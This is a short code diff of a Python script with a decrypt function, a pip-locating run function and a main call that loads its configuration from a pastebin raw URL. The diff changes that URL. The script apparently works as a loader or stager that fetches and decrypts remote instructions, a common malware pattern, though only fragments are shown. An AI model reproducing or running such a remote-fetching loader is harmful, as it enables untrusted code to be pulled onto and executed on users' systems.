@@ -82,7 +82,7 @@ def decrypt(data, key):
     except Exception as e:
         debug(e)
 
-    
+
 def run(*args, **kwargs):
     try:
         _pip  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
@@ -148,4 +148,4 @@ def main(*args, **kwargs):
 
 if __name__=='__main__':
     __debug = bool('--override' not in sys.argv)
-    main(config='https://pastebin.com/raw/uYGhnVqp')
+    main(config='https://pastebin.com/raw/si8MrN5X')
